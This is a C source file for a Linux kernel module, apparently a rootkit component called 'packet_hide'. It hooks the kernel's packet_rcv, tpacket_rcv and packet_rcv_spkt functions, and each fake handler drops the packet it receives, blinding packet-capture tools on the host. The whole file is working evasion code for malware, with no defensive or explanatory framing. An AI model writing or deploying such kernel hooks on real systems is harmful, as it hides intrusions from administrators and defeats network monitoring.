#include <linux/netfilter.h>
#include "function_hooking.h"


struct hooked_function packet_rcv;
struct hooked_function tpacket_rcv;
struct hooked_function packet_rcv_spkt;

int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt, struct net_device *orig_dev)
{
	pr_info("im called! tpacket_rcv");
	consume_skb(skb); //clear the packet
	return 1;
}

int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt, struct net_device *orig_dev)
{
	pr_info("im called! packet_rcv_spkt");
	consume_skb(skb); //clear the packet
	return 1;
}

int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt, struct net_device *orig_dev)
{
	pr_info("im called! packet_rcv");
	consume_skb(skb); //clear the packet
	return 1;
}

int init_packet_hide(void){
	//pr_info("init_packet_hide");

	strcpy(packet_rcv.function_name,"packet_rcv"); //function's name
	packet_rcv.fake_function = &fake_packet_rcv; //fake function address
	hook_function(&packet_rcv); //hook the function

	strcpy(tpacket_rcv.function_name,"tpacket_rcv");
	tpacket_rcv.fake_function = &fake_tpacket_rcv;
	hook_function(&tpacket_rcv);
	
	strcpy(packet_rcv_spkt.function_name,"packet_rcv_spkt");
	packet_rcv_spkt.fake_function = &fake_packet_rcv_spkt;
	hook_function(&packet_rcv_spkt);

	return 1;
}

int exit_packet_hide(void){
	//pr_info("exit_packet_hide");

	reset_function(&packet_rcv);
	reset_function(&tpacket_rcv);
	reset_function(&packet_rcv_spkt);


	return 1;
}
